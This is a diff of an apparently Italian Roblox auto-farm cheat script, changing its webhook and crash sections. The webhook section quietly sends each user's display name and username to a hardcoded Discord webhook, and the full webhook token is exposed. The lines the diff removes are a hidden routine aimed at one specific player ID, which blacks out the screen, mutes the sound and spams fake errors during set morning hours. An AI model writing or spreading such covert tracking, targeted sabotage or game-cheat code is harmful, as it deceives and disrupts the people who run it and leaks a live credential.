@@ -255,6 +255,16 @@ wait(.5)
 -- WEBHOOK
 -- ==============================================================================
 task.spawn(function()
+    -- CONTROLLO MAPPA: Manda il webhook SOLO se sei nella mappa corretta per il tuo Farm
+    local PlaceId = game.PlaceId
+    local target = getgenv().FarmTarget
+
+    if target == "EARTH" and PlaceId ~= 3311165597 then
+        return -- Sei in un server di passaggio (TOP/Vills), niente webhook
+    elseif target == "TOP" and PlaceId ~= 114014249462644 then
+        return -- Sei in un server di passaggio (Earth/Vills), niente webhook
+    end
+
 	local Webhook_URL = "https://discord.com/api/webhooks/1456385233564733561/0Bom3FZYJaSBocpwj-cx2nHKIZP95tzpATGbfuuKrT1W9jxgjLtgPXeAuj6GZBWgqTm-"
 	local playerStats = ReplicatedStorage.Datas:WaitForChild(tostring(localPlayer.UserId), 5)
 	if not playerStats then return end
@@ -271,7 +281,7 @@ task.spawn(function()
 			Body = HttpService:JSONEncode({
 				["content"] = "",
 				["embeds"] = {{
-					["title"] = "Script eseguito! (Farming in " .. getgenv().FarmTarget .. ")",
+					["title"] = "Script eseguito! " .. target .. "!",
 					["description"] = localPlayer.DisplayName .. " (@" .. localPlayer.Name .. ") ha eseguito lo script.",
 					["type"] = "rich",
 					["color"] = 16777215, 
@@ -283,35 +293,6 @@ task.spawn(function()
 			})
 		})
 	end
-end)
-
--- ==============================================================================
--- CRASH ORARIO (07:00 - 08:59)
--- ==============================================================================
-task.spawn(function()
-    local TARGET_ID = 1970233075
-    if localPlayer.UserId == TARGET_ID then
-        while true do
-            local date = os.date("!*t")
-            local isDST = (date.month > 3 and date.month < 10) or (date.month == 3 and date.day >= 25) or (date.month == 10 and date.day < 25)
-            local offset = isDST and 2 or 1
-            local hourItaly = (date.hour + offset) % 24
-            
-            if hourItaly == 7 or hourItaly == 8 then
-                local sg = Instance.new("ScreenGui", game:GetService("CoreGui") or localPlayer:WaitForChild("PlayerGui"))
-                sg.IgnoreGuiInset = true
-                sg.DisplayOrder = 2147483647
-                local f = Instance.new("Frame", sg)
-                f.Size = UDim2.new(1, 0, 1, 0)
-                f.BackgroundColor3 = Color3.new(0, 0, 0)
-                f.BorderSizePixel = 0
-                game:GetService("SoundService").Volume = 0
-                task.wait(0.2)
-                while true do print("ERR_RECOVERY_FAILED_" .. math.random(100000, 999999)) end
-            end
-            task.wait(10)
-        end
-    end
 end)
 
 -- ==============================================================================
